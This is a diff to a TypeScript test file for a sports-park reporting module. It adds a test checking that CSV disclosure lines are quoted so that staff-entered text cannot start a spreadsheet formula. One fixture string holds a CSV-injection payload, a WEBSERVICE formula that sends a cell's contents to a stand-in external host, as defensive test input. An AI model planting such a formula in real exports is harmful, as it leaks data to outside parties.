@@ -1,7 +1,13 @@
 import { REPORT_KEYS, type ReportResponse } from '@sportspark/contracts';
 import type { RestrictionStatus } from '@sportspark/db';
 import { describe, expect, it } from 'vitest';
-import { csvCell, renderCsv, renderJson, resultDigest } from './output/report-output';
+import {
+  csvCell,
+  csvPreambleLine,
+  renderCsv,
+  renderJson,
+  resultDigest,
+} from './output/report-output';
 import { CostInputMachine, ExportMachine, MetricDefinitionMachine } from './reporting.machines';
 import {
   COUNTED_RESTRICTION_STATES,
@@ -159,6 +165,23 @@ describe('report output (SPK-REPORT-007)', () => {
     expect(csv).toContain('# disclosure: a disclosure');
     expect(csv).toContain('title,n\r\n"Game, U10",3\r\n');
     expect(csv).toContain('MET-001,Scheduled,2,count,,,');
+  });
+
+  it('§4.14 (R3-REPORTING-09): every preamble line is one neutralized CSV cell, so staff-entered text never starts a formula cell', () => {
+    const hostile = 'Pitch 3,=WEBSERVICE("https://x.example/?"&A2),';
+    const csv = renderCsv({
+      ...result([]),
+      disclosures: [`Resource-equivalent weighting: ${hostile} = 1`, 'plain disclosure'],
+    });
+    const lines = csv.split('\r\n');
+    const weighting = lines.find((l) => l.includes('WEBSERVICE'))!;
+    // The whole line is one quoted cell: the comma no longer ends it and the quote is doubled.
+    expect(weighting).toBe(
+      `"# disclosure: Resource-equivalent weighting: ${hostile.replaceAll('"', '""')} = 1"`,
+    );
+    expect(lines).toContain('# disclosure: plain disclosure');
+    expect(csvPreambleLine('note', 'two\nlines, one cell')).toBe('"# note: two lines, one cell"');
+    expect(csvPreambleLine('k', '=1+1')).toBe('# k: =1+1');
   });
 
   it('the digest depends on the figures and the as-of instant, not on when or as which run they were produced', () => {
